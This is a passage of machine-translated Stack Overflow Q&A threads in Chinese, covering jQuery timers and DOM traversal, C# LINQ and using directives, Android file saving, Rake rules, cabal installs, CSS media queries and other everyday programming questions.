secondfield.x = 0;
secondfield.y = 40;
secondfield.width = 200;
secondfield.height = 30;
addChild(secondfield); 
```

# jquery - JQuery 的 setInterval 停止延迟初始加载？

> ID：16122718
> 
> 赞同：0
> 
> 时间：2013-04-20T16:41:18.057
> 
> 标签：jquery, html

我无法让这个 JQuery 第一次立即加载，但在初始加载后延迟 2000 毫秒刷新？这可以正常刷新，但我希望它在第一个时间间隔立即加载页面。

```
<script>
 $(function(){
  setInterval(function(){
  $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");},2000);
  });
</script>
<div id="myDiv" class="myDiv"></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:42:58.760

尝试

```
$(function(){
    $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");
    setInterval(function(){
        $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");
    },2000);
}); 
```

如果你想要一个更干净的

```
$(function(){
    function load(){
        $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");
    }

    load();

    setInterval(load,2000);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:44:45.037

怎么样

```
function loadDiv(){
   $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");
}

$(function(){
    loadDiv();
    setTimeout( loadDiv, 2000);
}); 
```

* * *

*忽略以下初始答案，因为它意味着每两秒重新加载一次..*

```
function loadDiv(){
   $("#myDiv").load("mysql.php?dove=<?php echo $a; ?>");
   setTimeout( loadDiv, 2000);
}

$(loadDiv); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:54:12.737

试试这个...

```
$('#myDiv').delay(500).queue(function( nxt ) {
    $(this).load('mysql.php?dove=<?php echo $a; ?>');
    nxt();
}); 
```

# opencl - 如何在 Linux Mint 中安装 OpenCL

> ID：16122719
> 
> 赞同：0
> 
> 时间：2013-04-20T16:41:24.907
> 
> 标签：opencl

我正在尝试通过 Intel Atom 1.8 32 位 CPU 在 Linux Mint 中安装 OpenCL，但在 Intel 网站上只有 64 位 CPU。

有谁知道如何使用 32 位 CPU 安装它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-22T11:39:58.660

不幸的是，英特尔的 OpenCl 运行时具有很高的平台要求（具有 SSE 4.1 的核心系列用于 CPU 计算或用于 GPU 的第三代核心处理器）。
使用 AMD 的 OpenCL 运行时。它只需要一个支持 SSE2 的处理器。[http://developer.amd.com/tools/heterogeneous-computing/amd-accelerated-parallel-processing-app-sdk/downloads/](http://developer.amd.com/tools/heterogeneous-computing/amd-accelerated-parallel-processing-app-sdk/downloads/)

# git - 使用“git aws.push”覆盖我的弹性 beantalk 应用程序的数据库

> ID：16122722
> 
> 赞同：0
> 
> 时间：2013-04-20T16:41:33.717
> 
> 标签：git, flask, amazon-elastic-beanstalk

我的 git repo 的根目录中有一个“comments.db”文件，用于亚马逊托管的烧瓶应用程序。

它在服务器上工作得很好 - 当有人向帖子添加评论时，服务器上的数据库会相应更新。但是，每当我对应用程序的其他部分进行更改时，任何使用“git aws.push”将这些更改推送到服务器，服务器上的数据库都会被我本地计算机上的数据库文件覆盖 - 所以任何条目添加到服务器数据库的内容丢失。

似乎如果我在我的 gitignore 中粘贴“comments.db”，那么“git aws.push”会完全从服务器中删除数据库文件。

如何在不破坏服务器数据库的情况下对我的应用程序进行不相关的更改并推送它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-17T15:50:38.053

正如您所发现的，当您更新应用程序时，Elastic Beanstalk 不会保留旧文件。只有应用程序本身的文件才应该在应用程序中。您应该将数据存储在 Amazon 的其他数据库服务之一中，例如 RDS，并将用户上传的文件存储在 S3 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:59:39.093

是否曾经签入过comments.db？我认为如果文件没有存储库，它会更好地工作，它 git 永远不会看到它或触摸它。

如果它已经是存储库的一部分，您可以使用`git rm --cached`. 这会将其保留在您运行命令的工作副本中，但是当他们`git pull`在生产机器上执行此操作以保留文件时，将其删除到其他任何地方。

在每台开发机器上，您都可以创建一个新的相同文件，用于开发和测试。

不要忘记将其添加到您的忽略/排除文件中。

# c# - 从对象列表中获取变量

> ID：16122729
> 
> 赞同：1
> 
> 时间：2013-04-20T16:42:09.230
> 
> 标签：c#, arrays, list, variables, object

如何从列表中的每个对象中获取变量？

到目前为止我有这个：

```
void SortList()
{
    int j = modules.Count;
    string[] titles = new string[j];

    for (int i = 0; i > modules.Count; i++)
    {
        titles[i] = 
    }
} 
```

我试图从模块中的每个对象中获取变量“代码”。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:45:03.630

暗示模块是一个列表或一个数组，

```
void SortList()
{
    int j = modules.Count;
    string[] titles = new string[j];

    foreach (String title in modules)
    {
        titles[i] = title.code
    }
} 
```

正如 Cuong Le 所说，您还可以使用[Linq](http://msdn.microsoft.com/en-CA/library/bb548891.aspx)获得更短的版本（取决于您使用的 .Net 版本）。

```
titles = modules.Select(x => x.code).ToArray(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:44:23.420

您可以使用带有简单代码的 LINQ`Select`方法：

```
titles = modules.Select(x => x.code).ToArray(); 
```

# wordpress - Wordpress - 在 author.php 中显示 Bio 仅用于编辑角色

> ID：16122731
> 
> 赞同：0
> 
> 时间：2013-04-20T16:42:31.773
> 
> 标签：wordpress, roles, author

`author.php`根据帖子作者的角色，我有一个页面必须看起来不同。如果它的角色是*Editor*或*Admin*，则会显示 bios。否则（例如，对于 Author），它不是。但我在任何地方都找不到。我有一个线索可以使用`get_userdata`，但无法做到。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:00:45.167

可以查看`$wp_query`全局获取作者的角色：

```
global $wp_query;
$roles = $wp_query->queried_object->roles;
if( $roles[0] == 'editor' ) {
    // do stuff
} 
```

# c - C - freopen() 用于重定向需要 fclose()？

> ID：16122732
> 
> 赞同：3
> 
> 时间：2013-04-20T16:42:35.487
> 
> 标签：c

在调用 freopen(file_name, open_mode, stderr) 之后，我需要在进程结束之前调用 fclose(stderr) 还是自动完成？提前感谢，对不起我的英语

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:44:56.473

没有必要关闭打开的流，因为所有打开的流都在程序终止时关闭，但`fclose`每次`fopen`调用都有一个很好的做法。在`stderr`此处的情况下，此流在启动时已经打开（您不必调用`fopen`），因此即使`freopen`发出了一些调用，我也认为没有理由显式关闭它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T16:45:32.507

当一个进程结束时，它的所有句柄都会自动关闭。但是，关闭**您获得**的每个句柄是一种很好的方式- 例如，有人可能想要将您的程序转换为库，或者您可能正在寻找泄漏。你是否打电话`freopen`并不重要。

**但是**，在 stderr 的情况下，情况有点不同。由于您没有专门打开该流，因此不应关闭它。它也很可能被您无法控制的其他组件使用，例如 atexit 函数或堆栈粉碎检测。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:44:31.410

是的，这是一种很好的做法，但如果您的进程将立即结束，则并非绝对必要，因为当进程终止时，操作系统会为您清理所有内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T16:45:33.460

当然。并且`fclose(stderr);`会做。

# android - Android 将图像保存到新文件夹

> ID：16122735
> 
> 赞同：0
> 
> 时间：2013-04-20T16:42:50.343
> 
> 标签：android, string, save, directory, android-image

我正在尝试将我不久前拍摄的照片保存到另一个文件夹中（该文件夹已经存在）。我的清单在我需要的权限上是最新的，并且我知道我需要使用以下内容：

```
MediaStore.Images.Media.insertImage(getContentResolver(), yourBitmap, yourTitle , yourDescription); 
```

以下是我的代码。我做错了什么，它不会保存？谢谢！

save.setOnClickListener(new View.OnClickListener() {

```
@Override
public void onClick(View v) {
// TODO Auto-generated method stub

int id = viewIt.getId();

String root = Environment.getExternalStorageDirectory().toString();
String myDir = new String(root + "/New Directory/Folder 1/"); 
String description = "";
String filestring = arrPath[id];        
try {
    MediaStore.Images.Media.insertImage(getContentResolver(), myDir, filestring, description);
    } catch (FileNotFoundException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
    } 
    sendBroadcast(new Intent(Intent.ACTION_MEDIA_MOUNTED,
    Uri.parse("file://" +  Environment.getExternalStorageDirectory())));

    Toast.makeText(getApplicationContext(), "Save Successful", Toast.LENGTH_SHORT).show();          

    }
}); 
```

以下是我的 logcat 中的错误：

```
04-20 17:38:03.763: E/AndroidRuntime(1003): FATAL EXCEPTION: main
04-20 17:38:03.763: E/AndroidRuntime(1003): java.lang.NullPointerException
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.provider.MediaStore$Images$Media.insertImage(MediaStore.java:551)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at com.test.Import$ImageAdapter$2$4$1.onClick(Import.java:339)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.view.View.performClick(View.java:2485)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.view.View$PerformClick.run(View.java:9080)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.os.Handler.handleCallback(Handler.java:587)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.os.Handler.dispatchMessage(Handler.java:92)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.os.Looper.loop(Looper.java:123)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at android.app.ActivityThread.main(ActivityThread.java:3683)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at java.lang.reflect.Method.invoke(Method.java:507)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-20 17:38:03.763: E/AndroidRuntime(1003):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:08:49.737

1) 带空格的文件夹名称可能会出现问题，因此请确保检查文件夹是否存在，否则创建它。

```
File file = new File(myDirPath); 
if(!file.exists()) {
  if(!file.mkdirs()){
    Log.e("TAG", "Error: You can't create folder");   
  }
} 
```

2) 可能有一个错误，但您没有看到它，因为您捕获了异常但不打印它。

尝试更换这个

> ```
> e.printStackTrace(); 
> ```

和

> Log.e("TAG", "错误："+ e.toString());

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-22T19:08:10.663

我想到了！我决定走一条不同的路线，只是重命名文件。我意识到我不想要多个相同的图像（试图节省 sdcard 空间）所以我这样做了：

```
int id = viewIt.getId();

File sdcard = Environment.getExternalStorageDirectory();
File sdddcard = new File(sdcard + "/New Directory/Folder 1/");

File from = new File(arrPath[id]);

Random generator = new Random(); 
int n = 10000;
n = generator.nextInt(n);
String filename = "ImageImport-"+ n +".jpg";

File to = new File(sdddcard,filename);

from.renameTo(to); 
```

# c# - 如何向 System.Data.Entity 命名空间添加“使用”语句

> ID：16122740
> 
> 赞同：2
> 
> 时间：2013-04-20T16:43:17.497
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, visual-studio-2012

一般来说，我是 Visual Studio 和 C# 的新手。我正在学习一个试图学习语言的教程（[教程在这里](http://weblogs.asp.net/scottgu/archive/2011/05/05/ef-code-first-and-data-scaffolding-with-the-asp-net-mvc-3-tools-update.aspx)）。

其中一个步骤是**将“using”语句添加到类文件顶部的 System.Data.Entity 命名空间（以引用 DbContext 和 DbSet 类）**。这可以在第 3 步下找到。

我希望有人可以帮助我解决这个部分。我在这里和谷歌上搜索了答案，但由于我是该语言的新手，我似乎无法找到正确的答案。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:45:24.207

在文件的顶部应该有几行，每行都以该关键字开头`using`和命名空间。

在您的教程中提到的命名空间中添加另一个：

```
using System.Data.Entity; 
```

`using`您可以在 MSDN 上找到更多信息： [`using`Directive (C# Reference)](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:58:03.917

尽管您的问题是关于`using` **声明**的，但我相信您的意思是`using` **指令**。

### 使用指令

要允许在命名空间中使用类型，以便您不必限定在该命名空间中使用类型：

```
using System.Data.Entity;

namespace MyNamespace
{
    // Your code
} 
```

Using 指令通常放在文件的顶部，但它们也可以放在命名空间的顶部。

```
namespace MyNamespace
{
    using System.Data.Entity;

    // Your code
} 
```

*有关使用指令的更多信息，请参阅*：[使用指令（C# 参考）](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)

关于引用的注意事项：在使用之前`System.Data.Entity`，您需要添加对 EntityFramework.dll 的引用。[NuGet](http://nuget.org/packages/EntityFramework/5.0.0)是一个很好的工具，可以使用[Visual Studio 包管理器](http://docs.nuget.org/docs/start-here/using-the-package-manager-console)调用。

### 使用别名指令

为命名空间或类型创建别名。这称为使用别名指令：

```
using Project = PC.MyCompany.Project; 
```

*有关使用别名指令的更多信息，请参阅*：[使用指令（C# 参考）](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)

### 使用语句

提供方便的语法，确保正确使用 IDisposable 对象：

```
using (var font1 = new Font("Arial", 10.0f)) 
{
    byte charset = font1.GdiCharSet;
} 
```

*有关 using 语句的更多信息，请参阅*：[using 语句（C# 参考）](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:48:32.270

它被称为[using 指令](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)

C# 编程中使用的每个类、枚举和其他元素都包含在命名空间中。
要使用这些元素，您需要引用此命名空间，这会导致标识符非常长。指示编译器`using directive`在哪个命名空间中查找元素的定义。

您只需要在类文件的开头添加一行，说明您打算在文件的其余部分中使用的命名空间。例如，如果你想在你的应用程序中使用 SqlConnection，没有 using 指令你应该写：

```
System.Data.SqlClient.SqlConnection con = new System.Data.SqlClient.SqlConnection(.....) 
```

相反，添加

```
using System.Data.SqlClient; 
```

你可以简单地写

```
SqlConnection con = new SqlConnection(.....) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T17:32:10.343

您可以按 Ctrl + 。Visual Studio 中的 (dot) 和 using 语句将自动添加。

# macos - 在 bash 终端中重做链接

> ID：16122742
> 
> 赞同：0
> 
> 时间：2013-04-20T16:43:18.213
> 
> 标签：macos, bash

所以我刚刚通过 brew 包管理器在 OS X 10.8 上安装了 emacs 版本 24，它安装在`/usr/local/Cellar/emacs`. 我经常使用 emacs 版本 22 的内置版本，但它在`/usr/bin`.

所以有两件事我想知道怎么做

1.  更改它，以便 bash 查找的第一个位置 `/usr/local/Cellar`及其垃圾箱
2.  只需更改它，以便 emacs in`/usr/bin`的 bin 调用emacs in 的 bin `/usr/local/Cellar/emacs/bin`。

这是两个独立但相关的问题。

编辑：所以我做了一个黑客工作，只是编辑`.bash_profile`并导出了`/usr/local/Cellar/emacs/24.3/bin`..但仍然想知道如何让一个垃圾箱调用另一个垃圾箱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T19:16:56.737

最好不要触摸 /{usr/,}{s,}bin 中的任何内容。您可以通过在 .bash_profile 中添加类似这样的内容来在 bash 中使用自制版本：

```
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin 
```

将 /usr/local/bin 和 /usr/local/sbin 先放在 /etc/launchd.conf 中可能会产生一些意想不到的副作用。例如，在 TextMate 中，如果`env ruby`是 Ruby 2.0 或 1.9，许多命令将停止工作。

或者例如将 PATH 设置为`~/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin`并将符号链接添加到 ~/bin/. 看到[这个答案](https://superuser.com/a/580611/69039)。

# rake - Rake 无法识别具有多个扩展名的规则

> ID：16122744
> 
> 赞同：2
> 
> 时间：2013-04-20T16:43:22.123
> 
> 标签：rake

我使用 Rake 从 Markdown 文件生成 PDF。如果 Markdown 文件是，我不`filename.md`喜欢 PDF ，以便自动完成以我喜欢的方式工作，并且清楚 PDF 文件的来源是什么。`filename.md.pdf``filename.pdf`

我有这个 Rake 文件，它工作正常。

```
MDFILES = FileList["*.md"]
PDFS = MDFILES.ext("pdf")

desc "Build PDFs of all chapters"
task :pdfs => PDFS

# Build PDFs from Markdown source
rule ".pdf" => ".md" do |t|
  sh "pandoc #{t.source} -o #{t.name}"
end 
```

如果我运行`rake pdfs`或`rake filename.pdf`按预期生成 PDF，但 PDF 被命名为`filename.pdf`.

但我希望 Rakefile 改为：

```
MDFILES = FileList["*.md"]
PDFS = MDFILES.ext("md.pdf")

desc "Build PDFs of all chapters"
task :pdfs => PDFS

# Build PDFs from Markdown source
rule "md.pdf" => ".md" do |t|
  sh "pandoc #{t.source} -o #{t.name}"
end 
```

运行`rake pdfs`或`rake filename.md.pdf`返回错误`Don't know how to build task 'filename.md.pdf'`。

如何以我想要的方式生成文件名？

顺便说一句，这种类型的规则适用于 Make，即：

```
%.md.pdf : %.md
        pandoc $< -o $@ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-10T16:09:11.653

最近，当我尝试在规则中指定带有多个点的扩展名时，我自己也遇到了类似的问题。我通过使用[此处描述的不同规则语法解决了它。](https://github.com/jimweirich/rake/blob/master/doc/rakefile.rdoc#advanced-rules)

为您的规则尝试这样的事情：

```
rule( /\.md\.pdf$/ => [
    proc {|task_name| task_name.sub(/\.md\.pdf$/, '.md') }
]) do |t|
    sh "pandoc #{t.source} -o #{t.name}"
end 
```

# javascript - 通过向后遍历 DOM 获取最近的元素

> ID：16122746
> 
> 赞同：4
> 
> 时间：2013-04-20T16:43:32.017
> 
> 标签：javascript, jquery

我想用 jQuery 获得一个 DOM 元素，但我只想在 DOM 中向后看。

所以假设我有以下 HTML 结构：

```
<div id="content">
    <div id="first-module" class="module">
        <h3>Some Module</h3>
        <p>Lorem ipsum... </p>

        <div id="some-other-content">
            <div id="second-module" class="module">
                <h3>Some other module</h3>
                <p>Dolor sit amet...</p>
                <button class="trigger">Trigger 1</button>
            </div>
        </div>

        <button class="trigger">Trigger 2</button>
        <div id="third-module" class="module">
            <h3>Another module</h3>
        </div>
    <div>
</div>

$('.trigger').click(function() {
    // Traverse DOM to find closest .module class
}); 
```

因此，当我单击`Trigger 1`按钮时，我希望它找到`div`带有 ID的按钮`second-module`。

当我单击时，`Trigger 2`我希望它找到`div`带有 ID`first-module`而**不是** `second-module`，因为它的嵌套比`Trigger 2`按钮更深。

有没有一个jQuery函数呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:44:54.863

尝试使用[.closest()](http://api.jquery.com/closest/)

```
$('.trigger').click(function() {
    $(this).closest('.module');
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-20T16:47:09.233

是的，我们确实有[.closest()](http://api.jquery.com/closest/)：

```
$('.trigger').click(function() {
    // Traverse DOM to find closest .module class
    var id = $(this).closest('.module').attr('id');
    alert(id);
}); 
```

[**在这里演示**](http://jsfiddle.net/gPh7c/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T16:47:39.213

另一种访问它的方法是使用 [父选择器](http://api.jquery.com/parent/)

```
$('.trigger').click(function() {
   console.log($(this).parent('.module').attr('id'));
    // Traverse DOM to find closest .module class
}); 
```

# haskell - 无法通过 cabal install 安装 Hake

> ID：16122747
> 
> 赞同：2
> 
> 时间：2013-04-20T16:43:38.963
> 
> 标签：haskell, cabal, hake

我正在尝试通过 cabal install 安装无须鳕。

首先 - 虽然可用的最新软件包是 1.3.7，但 cabal 尝试安装 1.2

除此之外：

```
~ % cabal install hake-1.2
Resolving dependencies...
Configuring hake-1.2...
Building hake-1.2...
Preprocessing library hake-1.2...

Development/Hake.hs:49:8:
    Could not find module `System.Directory.Tools'
    Perhaps you meant System.Directory (from directory-1.1.0.2)
    Use -v to see a list of the files searched for.
Failed to install hake-1.2
cabal: Error: some packages failed to install:
hake-1.2 failed during the building phase. The exception was:
ExitFailure 1 
```

如果我尝试更具体 - 我会收到其他错误

```
~ % cabal install hake-1.3.7
Resolving dependencies...
cabal: Could not resolve dependencies:
trying: hake-1.3.7
rejecting: base-3.0.3.2, 3.0.3.1 (global constraint requires installed
instance)
rejecting: base-4.5.1.0/installed-81d... (conflict: hake => base<=4.3.1.0)
rejecting: base-4.6.0.1, 4.6.0.0, 4.5.1.0, 4.5.0.0, 4.4.1.0, 4.4.0.0, 4.3.1.0,
4.3.0.0, 4.2.0.2, 4.2.0.1, 4.2.0.0, 4.1.0.0, 4.0.0.0 (global constraint
requires installed instance) 
```

我难住了。

*更新*

看来作者已经在源代码中对包进行了相关更改，至少在 GitHub [https://github.com/YoshikuniJujo/hake_haskell](https://github.com/YoshikuniJujo/hake_haskell)上，但它们还没有在 Hackage 中。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T16:56:42.470

`base`on有一个上限`hake`，可以防止最新版本与最新版本的 ghc 一起安装。（旧版本`hake`缺少上限，但实际上需要一个上限，这解释了您遇到的第一个错误。）

最好的选择是联系作者并要求他将更新版本上传到 Hackage。下一个最好的（也是更直接的）选项是自己编辑`.cabal`文件。

说

```
$ cabal unpack hake-1.3.7
$ cd hake-1.3.7 
```

然后编辑`hake.cabal`，找到`Build-Depends:`包含的行并将其`base<=4.3.1.0`更改为简单地说`base`。然后说

```
$ cabal install 
```

在那个目录中。当然，这种修改依赖项并不总能保证有效，但在这种情况下，似乎可以。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T16:57:41.947

查看依赖项`base (≤4.3.1.0)`，`hake-1.3.7`需要一个相当旧版本的`base`库。看起来它[最多需要 GHC 7.0](http://www.haskell.org/ghc/docs/7.0.1/html/users_guide/release-7-0-1.html)。Cabal 认为无法满足要求`base`，因此拒绝安装`hake`。

`hake-1.2`，另一方面，没有指定对 的上限要求`base`。由于 Cabal 不知道需求，它错误地尝试构建`hake`，它只是无法编译。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-12-23T16:18:59.750

感谢您使用我的程序。我是鳕鱼作者。我已经上传了新版本的鳕鱼。请尝试一下。 [http://hackage.haskell.org/package/hake-1.3.8.1](http://hackage.haskell.org/package/hake-1.3.8.1)

# javascript - 在我的 jQuery 中，为什么 indexOf 没有从我的数组中找到键？

> ID：16122757
> 
> 赞同：1
> 
> 时间：2013-04-20T16:44:51.793
> 
> 标签：javascript, jquery, html, arrays, indexof

我一直在努力让它工作，但似乎没有任何帮助。

所以我在图片数组中有两个图像。我想要做的是，当您单击上一张图片时，会出现下一张。我很确定问题出在这个问题上，`indexOf`因为它每次都返回-1。

如果我替换行：

`pictures[listIndex+1].show("drop", {direction: "up"}, 1000);`<---不起作用。

带线：

`pictures[1].show("drop", {direction: "up"}, 1000);`<---它有效，但不是很有用。

我希望你明白我的问题是什么，并为我糟糕的英语感到抱歉。我真的很感谢你的帮助。

```
$(document).ready(function(){
    var pictures = [$("#link"), $("#italy1")];
    pictures[1].hide();
    $("#link").click(function(){
        var listIndex = pictures.indexOf($(this));
        pictures[listIndex+1].show("drop", {direction: "up"}, 1000);
    });
    $("#italy1").click(function(){
        $(this).hide("drop", {direction: "up"}, 1000);
});
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:54:29.010

那是因为您将元素包装在 jQuery 对象中。即使两个 jQuery 对象包含相同的元素，它们仍然是两个独立的对象，因此该`indexOf`方法无法通过寻找另一个来找到一个。

将元素本身放入数组中：

```
var pictures = [$("#link").get(0), $("#italy1").get(0)]; 
```

现在您可以使用元素引用来查找数组中的元素。使用该`$.inArray`方法，因为它也适用于没有该`Array.indexOf`方法的浏览器：

```
var listIndex = $.inArray(this, pictures); 
```

当然，当你从数组中获取元素时，你需要将它包装在一个 jQuery 对象中，以便在其上使用 jQuery 方法：

```
$(pictures[listIndex+1]).show("drop", {direction: "up"}, 1000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:48:39.950

也许[jQuery.inArray](http://api.jquery.com/jQuery.inArray/)可以解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:51:50.523

如果要选择下一个`$("#link")`，可以随时使用**`$(this).next("#link")`**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T17:12:07.637

为了支持 Guffa，像这样的[FIDDLE](http://jsfiddle.net/atombob/JSsuZ/)。

```
$(document).ready(function(){
    var pictures = [$("#link").get(0), $("#italy1").get(0)];

    $(pictures[1]).hide();

    $("#link").on('click', function(){
        var listIndex = $.inArray(this, pictures);
        $(pictures[listIndex+1]).show("drop", {direction: "up"}, 1000);
    });

    $("#italy1").on('click', function(){
        $(this).hide("drop", {direction: "up"}, 1000);
    });
}); 
```

# css - 媒体查询平板纵向及下方

> ID：16122767
> 
> 赞同：7
> 
> 时间：2013-04-20T16:45:58.540
> 
> 标签：css, media-queries

我知道如何对平板电脑肖像和手机进行媒体查询。但是，是否有可能**对所有人都只有一个媒体查询：平板电脑肖像和手机**？

```
/* tablets portrait */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px)
and (orientation : portrait) { 

}

/* phones */
@media screen and (max-device-width: 640px) { 

}

/* tablets portrait and phones 
Is it possible to have only one media query for this that do the same than the other media queries together?
*/ 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-21T02:19:11.950

不。

**为什么？**

iPad 和 iPhone 是不同的设备，具有不同的屏幕尺寸、分辨率和不同的像素密度（基于不同的版本/发布 - 请参阅[此处](http://en.wikipedia.org/wiki/List_of_displays_by_pixel_density#Apple)）。

```
Device                     Screen(res)   CSS pixel ratio
iPad   (generation 1,2)    1024 × 768    1
iPad   (generation 3,4)    2048 × 1536   2
iPhone (gen 1,3G,3GS)      480 × 320     1
iPhone (gen 4,4S)          960 × 640     2
iPhone (gen 5)             1136 x 640    2 
```

iPad 被归类为平板电脑，iPhone 被归类为移动设备，因此您永远无法使用一个媒体查询来完全满足两者或为这两种设备创造理想的体验。

**我能做些什么？**

一种解决方案是提供一种相当常见的方法，并为 3 级设备类型和/或屏幕宽度/方向提供媒体查询：

*   手机/智能手机
*   药片
*   桌面

基本理论是您需要您的网站或应用程序在尽可能多的设备上可用/可查看，因此请标准化您的方法，而不是错过过多的单个设备和/或制造商。

一个粗略的例子可能是：

```
@media screen and (max-width:500px) {
   /* Mobile styles */
}
@media screen and (min-width:501px) and (max-width:999px) {
   /* Tablet styles */
}
@media screen and (min-width:1000px) {
   /* Desktop styles */
} 
```

但是对于这三种类型之间的最佳断点的看法*存在很大差异*，我知道关于此类断点的研究/数据将受到开发人员社区的广泛欢迎。

**如果我想专门针对 iOS 设备怎么办？**

你可以这样做。一些人提出了满足特定 iOS 设备特定要求的媒体查询（未经测试，但我经常看到它以及我在下面列出的链接）：

```
/* iPads (portrait and landscape) ----------- */
   @media only screen 
   and (min-device-width : 768px) 
   and (max-device-width : 1024px) {
   /* Styles */
}

/* iPads (landscape) ----------- */
   @media only screen 
   and (min-device-width : 768px) 
   and (max-device-width : 1024px) 
   and (orientation : landscape) {
   /* Styles */
}

/* iPads (portrait) ----------- */
   @media only screen 
   and (min-device-width : 768px) 
   and (max-device-width : 1024px) 
   and (orientation : portrait) {
   /* Styles */
}

/* iPhone 4 ----------- */
   @media
   only screen and (-webkit-min-device-pixel-ratio : 1.5),
   only screen and (min-device-pixel-ratio : 1.5) {
   /* Styles */
} 
```

其他人针对 iOS 所做的进一步努力：

*   [适用于 iPad 和 iPhone 的 CSS 媒体查询](http://stephen.io/mediaqueries/)
*   [基本 iPhone 和 iPad 屏幕组件像素尺寸](http://www.vickiwenderlich.com/2011/07/basic-iphone-ipad-screen-component-pixel-dimensions/)
*   [ios-test.css - iOS 设备的媒体查询](https://gist.github.com/mattyoho/1299352)
*   [SO问题：iPhone 5 CSS媒体查询](https://stackoverflow.com/questions/12539697/iphone-5-css-media-query)

一般参考：

*   [媒体查询功能（在 W3C）](http://www.w3.org/TR/css3-mediaqueries/#media1)
*   [维基百科条目](http://en.wikipedia.org/wiki/Media_queries)
*   [响应式设计测试工具](http://mattkersley.com/responsive/)

**警告**

我在上面使用了一种示例方法，但是可以通过多种方式应用媒体查询：

```
@media screen and (max-width:500px) { ... }
@import url(mobile.css) (max-width:500px);
<link rel="stylesheet" type="text/css" media="screen and (max-width: 500px)" href="mobile.css" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-05T16:37:25.887

看看 Detectizr ( [https://github.com/barisaydinoglu/Detectizr](https://github.com/barisaydinoglu/Detectizr) ) 它是一个 Modernizr ( [http://modernizr.com/](http://modernizr.com/) ) 扩展。

此 JS 将 CSS 类添加到 html 标记，以便您可以在没有媒体查询的情况下定位设备。例如 .phone{} 或 .tablet{}

# python - 如何将带有 python 的网页连接到 mod_wsgi？

> ID：16122770
> 
> 赞同：1
> 
> 时间：2013-04-20T16:46:10.117
> 
> 标签：python, mod-wsgi, xampp

当谈到 Python 并将其合并到 html 中时，我是一个完全的新手。我花了很多时间进行研究但没有运气，所以我所要求的只是一点帮助或我可以找到所需信息的区域。

我正在使用 AMPPS 开发一个网站，因为它预先安装了 mod_wsgi。我正在创建一个函数，用户可以在其中在文本区域 EG 中输入 Python 脚本

```
> print 'Hello World' 
```

用户按下执行按钮，然后结果将显示在页面中。我假设这是使用 html 和 Python 脚本发送并传递给服务器端的，因此 mod_wsgi 可以解码 python 并将其传回。

```
Hello World 
```

